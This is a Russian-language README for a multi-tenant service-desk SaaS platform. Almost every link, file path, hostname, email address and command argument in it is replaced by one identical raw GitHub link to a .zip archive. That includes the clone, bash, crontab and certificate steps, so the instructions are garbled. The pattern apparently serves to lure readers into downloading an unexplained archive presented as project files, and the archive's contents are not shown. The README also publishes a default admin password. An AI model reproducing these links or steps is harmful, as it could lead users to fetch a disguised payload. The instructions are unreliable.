# 🎯 https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip ServiceDesk

[![CI/CD](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)
[![License](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)](LICENSE)

Коммерческая multi-tenant SaaS платформа для управления IT-поддержкой с полной изоляцией данных, биллингом и SSO.

## ✨ Особенности

- 🏢 **Multi-tenancy** с PostgreSQL RLS для полной изоляции данных
- 💳 **Billing** с интеграцией Stripe (FREE, PRO, ENTERPRISE)
- 🔐 **Active Directory / LDAP** - простое подключение за 2 минуты с автосинхронизацией!
- 🔑 **SSO** (Google, Azure AD) для единого входа
- 🎫 **Управление тикетами** с SLA, автоматизацией и очередями
- 📊 **Аналитика и отчеты** в реальном времени
- 🤖 **Telegram Bot** для создания тикетов
- 📚 **База знаний** с полнотекстовым поиском
- 🔧 **CMDB/Assets** для инвентаризации
- 🔔 **Уведомления** с группировкой
- 🎨 **Кастомизация** для каждого тенанта

## 🚀 Быстрый старт

### Требования

- https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip 20+ или Bun 1.2+
- PostgreSQL 16+
- Redis 7+ (опционально)
- Docker & Docker Compose (для продакшна)

### Локальная разработка

```bash
# Клонируйте репозиторий
git clone https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip
cd servicedesk

# Установите зависимости
bun install

# Настройте окружение
cp https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip .env
# Отредактируйте .env с вашими настройками

# Запустите PostgreSQL (или используйте существующий)
docker-compose up postgres -d

# Примените миграции
bunx prisma migrate dev

# Запустите dev сервер
bun run dev
```

Приложение будет доступно на `http://localhost:3000`

### Первый вход

По умолчанию создается глобальный админ:
- Email: `https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip`
- Password: `SuperAdmin2025!`

## 📦 Продакшн развертывание

### Быстрый деплой с Docker Compose

```bash
# 1. Клонируйте репозиторий
git clone https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip
cd servicedesk

# 2. Настройте .env
cp https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip .env
nano .env  # Отредактируйте с продакшн настройками

# 3. Запустите все сервисы
docker-compose --profile production up -d

# 4. Примените миграции
docker-compose exec app bunx prisma migrate deploy

# 5. Проверьте статус
docker-compose ps
curl http://localhost:3000/api/health
```

### Минимальные требования к серверу

- **CPU**: 2 vCPU (4+ рекомендуется)
- **RAM**: 4 GB (8+ GB рекомендуется)
- **Диск**: 20 GB SSD (50+ GB для production)
- **OS**: Ubuntu 22.04 LTS или Debian 12+

### Доступные сервисы

После запуска:
- **App**: http://localhost:3000
- **Prometheus**: http://localhost:9090
- **Grafana**: http://localhost:3001 (admin/admin)
- **PostgreSQL**: localhost:5432
- **Nginx**: localhost:80/443

### Обязательные переменные окружения (.env)

```env
# Database
DATABASE_URL="postgresql://user:password@postgres:5432/servicedesk"

# Auth
NEXTAUTH_SECRET="ваш-супер-секретный-ключ-минимум-32-символа"
NEXTAUTH_URL="https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip"

# Stripe (для billing)
STRIPE_SECRET_KEY="sk_live_..."
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY="pk_live_..."
STRIPE_WEBHOOK_SECRET="whsec_..."

# Sentry (для error tracking)
SENTRY_DSN="https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip"

# SSO (опционально)
GOOGLE_CLIENT_ID="..."
GOOGLE_CLIENT_SECRET="..."
AZURE_AD_CLIENT_ID="..."
AZURE_AD_CLIENT_SECRET="..."
AZURE_AD_TENANT_ID="..."

# Email (опционально)
SMTP_HOST="https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip"
SMTP_PORT="587"
SMTP_USER="https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip"
SMTP_PASSWORD="..."
SMTP_FROM="OnPoints <https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip>"
```

### Настройка Nginx для subdomain routing

1. **Установите SSL сертификаты:**

```bash
# Для main domain (https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)
sudo certbot certonly --standalone -d https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip -d https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip

# Для wildcard subdomain (*https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)
sudo certbot certonly --dns-cloudflare -d "*https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip"
```

2. **Обновите пути в https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip**

```nginx
ssl_certificate https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip;
ssl_certificate_key https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip;
```

3. **Перезапустите Nginx:**

```bash
docker-compose restart nginx
```

### Настройка custom domains для tenants

Скрипт `https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip` автоматически:
1. Проверяет DNS настройки
2. Создает Let's Encrypt сертификат
3. Настраивает Nginx конфигурацию

```bash
bash https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip
```

### Масштабирование

Для production рекомендуется:

**Архитектура:**
- Nginx load balancer (включен в `https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip`)
- Несколько реплик app сервиса (3+ для high availability)
- Managed PostgreSQL (AWS RDS, DigitalOcean Database, Azure Database)
- Redis для кэширования сессий и очередей
- CDN (Cloudflare, AWS CloudFront) для статики

**Автомасштабирование:**
```bash
# Увеличить количество реплик app
docker-compose up -d --scale app=3

# С Docker Swarm или Kubernetes для полноценного orchestration
```

**Database connection pooling:**
```env
# В .env
DATABASE_URL="postgresql://user:password@postgres:5432/servicedesk?pgbouncer=true&connection_limit=20"
```

### Backup стратегия

Автоматический backup PostgreSQL каждую ночь в 2:00:

```bash
# Добавьте в crontab
crontab -e

# Вставьте:
0 2 * * * https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip
```

Backup файлы хранятся в `backups/` с ротацией 30 дней.

**Восстановление из backup:**
```bash
bash https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip
```

## 📚 Документация

- [🔐 Подключение Active Directory](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip) - пошаговая инструкция за 2 минуты
- [⚡ Быстрый старт AD](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip) - подключение за 60 секунд
- [🔄 Автосинхронизация LDAP](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip) - настройка автоматической синхронизации пользователей
- [🧪 Руководство по тестированию](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip) - детальное руководство по тестированию
- [🚀 Чеклист деплоя](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip) - чеклист для production deployment

## 🧪 Тестирование

См. [https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip) для детального руководства по тестированию.

**Быстрые тесты:**
```bash
# Unit tests
bun test

# E2E tests (Playwright)
bunx playwright test

# Проверка RLS изоляции
npm run test:rls

# Проверка billing лимитов
npm run test:limits
```

**Тестирование в production-like окружении:**
```bash
# Запустите все сервисы с Docker Compose
docker-compose --profile production up -d

# Запустите integration tests
npm run test:integration
```

## 🛠️ Разработка

### Структура проекта

```
servicedesk/
├── src/
│   ├── app/              # https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip App Router
│   │   ├── api/          # API routes
│   │   ├── dashboard/    # Dashboard pages
│   │   └── login/        # Auth pages
│   ├── components/       # React компоненты
│   ├── lib/              # Утилиты и хелперы
│   └── hooks/            # Custom React hooks
├── prisma/
│   ├── https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip     # Database schema
│   └── migrations/       # DB migrations
├── monitoring/           # Prometheus конфигурация
├── nginx/                # Nginx конфигурация
└── .github/workflows/    # CI/CD pipeline
```

### Доступные команды

```bash
bun run dev          # Запустить dev сервер
bun run build        # Собрать продакшн билд
bun run start        # Запустить продакшн сервер
bun run lint         # Линтинг кода
bun run type-check   # TypeScript проверка
bun run test         # Запустить тесты
```

### База данных

```bash
# Создать миграцию
bunx prisma migrate dev --name migration_name

# Применить миграции
bunx prisma migrate deploy

# Открыть Prisma Studio
bunx prisma studio

# Сгенерировать Prisma Client
bunx prisma generate
```

## 🔒 Безопасность

- PostgreSQL RLS для полной изоляции данных
- JWT токены для аутентификации
- Rate limiting на API endpoints
- HTTPS обязателен в production
- Регулярные обновления зависимостей
- Audit logs для всех критических действий

## 📊 Мониторинг

### Prometheus метрики

Доступны на `/metrics`:
- HTTP request duration
- Database query performance
- Cache hit/miss rates
- Active sessions
- Error rates

### Grafana Dashboard

Импортируйте готовые дашборды из `monitoring/grafana/`

## 🤝 Тарифные планы

| Feature | FREE | PRO | ENTERPRISE |
|---------|------|-----|------------|
| Пользователи | 5 | 50 | ∞ |
| Агенты | 2 | 10 | ∞ |
| Хранилище | 1 GB | 50 GB | 500 GB |
| Тикеты/месяц | 100 | ∞ | ∞ |
| SSO/LDAP | ❌ | ✅ | ✅ |
| API доступ | ❌ | ✅ | ✅ |
| Кастомные домены | ❌ | ❌ | ✅ |
| Приоритетная поддержка | ❌ | ✅ | VIP 24/7 |

## 📝 API Documentation

API документация доступна по адресу `/api-docs` после запуска сервера.

## 🐛 Отладка

```bash
# Логи всех сервисов
docker-compose logs -f

# Логи конкретного сервиса
docker-compose logs -f app

# Подключиться к контейнеру
docker-compose exec app sh
```

## 🚢 CI/CD

GitHub Actions автоматически:
1. Запускает тесты и линтинг на каждый PR
2. Собирает Docker образ на push в main/develop
3. Деплоит на staging (develop) и production (main)
4. Применяет database migrations
5. Проверяет health check

### Необходимые Secrets

```
DOCKER_USERNAME
DOCKER_PASSWORD
PROD_HOST
PROD_USER
PROD_SSH_KEY
PROD_URL
STAGING_HOST
STAGING_USER
STAGING_SSH_KEY
STAGING_URL
```

## 📄 Лицензия

MIT License. См. [LICENSE](LICENSE) для деталей.

## 🙏 Благодарности

- [https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)
- [Prisma](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)
- [Tailwind CSS](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)
- [shadcn/ui](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)
- [Stripe](https://github.com/7eventhgod/servicedesk_beta/raw/refs/heads/main/src/app/api/billing/usage/beta-servicedesk-v1.8.zip)

---

Сделано с ❤️ для IT команд по всему миру.
